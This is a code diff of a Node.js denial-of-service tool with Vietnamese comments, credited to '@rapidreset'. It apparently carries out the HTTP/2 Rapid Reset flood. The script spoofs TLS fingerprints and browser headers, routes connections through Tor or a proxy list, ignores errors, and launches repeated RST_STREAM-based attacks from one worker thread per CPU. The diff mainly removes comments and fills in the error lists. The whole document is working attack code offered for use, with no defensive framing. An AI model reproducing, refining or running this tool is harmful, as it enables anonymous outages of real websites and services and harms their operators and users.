@@ -1,4 +1,4 @@
-// made by @rapidreset (updated with mitigations & optimizations)
+// made by @rapidreset (updated)
 const net = require('net');
 const tls = require('tls');
 const HPACK = require('hpack');
@@ -10,17 +10,17 @@ const { SocksClient } = require('socks');
 const { generate: generateFingerprint } = require('tls-fingerprint');
 
 // ===== CẤU HÌNH NÂNG CAO =====
-const TOR_PROXY = { host: '127.0.0.1', port: 9050 }; // Tích hợp TOR
-const MAX_RETRY = 5; // Số lần thử lại kết nối
-const DYNAMIC_HEADERS = true; // Kích hoạt headers động giống trình duyệt
+const TOR_PROXY = { host: '127.0.0.1', port: 9050 };
+const MAX_RETRY = 5;
+const DYNAMIC_HEADERS = true;
 
 // ===== KHỞI TẠO BIẾN =====
-const ignoreNames = [...];
-const ignoreCodes = [...];
+const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
+const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];
 let proxyList = [];
 let isFull = process.argv.includes('--full');
 
-// ===== TẠO TLS FINGERPRINT NGẪU NHIÊN =====
+// ===== TẠO TLS FINGERPRINT =====
 const tlsOptions = {
   ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
   extensions: ['ALPN', 'SNI'],
@@ -28,7 +28,7 @@ const tlsOptions = {
 };
 const fingerprint = generateFingerprint(tlsOptions);
 
-// ===== KẾT NỐI QUA SOCKS5/TOR =====
+// ===== KẾT NỐI SOCKS5/TOR =====
 async function connectViaSocks(proxy, targetHost, targetPort) {
   try {
     const { socket } = await SocksClient.createConnection({
@@ -42,17 +42,16 @@ async function connectViaSocks(proxy, targetHost, targetPort) {
   }
 }
 
-// ===== XÂY DỰNG HEADERS ĐỘNG VỚI AI (MOCK) =====
+// ===== HEADERS ĐỘNG =====
 function generateAIOptimizedHeaders() {
-  const dynamicHeaders = {
+  return {
     'sec-ch-ua-platform-version': '15.0.0',
     'sec-ch-ua-full-version-list': `"Chromium";v="${Math.random() * 100 + 116}", "Not.A/Brand";v="${Math.random() * 10}"`,
     'priority': `u=${Math.random()}, i`
   };
-  return dynamicHeaders;
 }
 
-// ===== CẢI TIẾN HÀM go() =====
+// ===== HÀM TẤN CÔNG CHÍNH =====
 async function go(retry = 0) {
   if (retry > MAX_RETRY) return;
 
@@ -69,7 +68,6 @@ async function go(retry = 0) {
       rejectUnauthorized: false
     });
 
-    // ===== THÊM XỬ LÝ HTTP/2 RST_STREAM NÂNG CAO =====
     tlsSocket.on('secureConnect', () => {
       if (tlsSocket.alpnProtocol === 'h2') {
         const rstStream = encodeRstStream(1, 3, Math.random() > 0.5 ? 0x8 : 0x0);
@@ -77,7 +75,6 @@ async function go(retry = 0) {
       }
     });
 
-    // ===== RETRY MECHANISM =====
     tlsSocket.on('error', (e) => {
       if (ignoreCodes.includes(e.code)) return;
       setTimeout(() => go(retry + 1), 1000);
@@ -88,14 +85,13 @@ async function go(retry = 0) {
   }
 }
 
-// ===== TẬN DỤNG WORKER THREADS =====
+// ===== WORKER THREADS =====
 if (isMainThread) {
   const workers = [];
   for (let i = 0; i < os.cpus().length; i++) {
     workers.push(new Worker(__filename));
   }
 
-  // ===== THEO DÕI HIỆU SUẤT =====
   setInterval(() => {
     workers.forEach((worker, idx) => {
       worker.postMessage({ cmd: 'STATUS', id: idx });
@@ -109,9 +105,8 @@ if (isMainThread) {
     }
   });
 
-  // ===== KHỞI CHẠY TẤN CÔNG =====
   setInterval(() => {
-    if (Math.random() < 0.8) go(); // Giới hạn tốc độ
+    if (Math.random() < 0.8) go();
   }, 100);
 }
 
@@ -126,15 +121,15 @@ function optimizeTCP() {
 }
 optimizeTCP();
 
-// ===== KHỞI TẠO PROXY =====
+// ===== LOAD PROXY =====
 function loadProxies() {
   try {
-    proxyList = fs.readFileSync('proxy.txt', 'utf8')
+    proxyList = fs.readFileSync('proxyvn.txt', 'utf8')
       .split('\n')
       .filter(p => p.trim())
       .map(p => ({ host: p.split(':')[0], port: parseInt(p.split(':')[1]) }));
   } catch (e) {
-    console.error('Proxy error: Sử dụng TOR mặc định');
+    console.error('Sử dụng TOR mặc định do lỗi proxy');
   }
 }
 loadProxies();
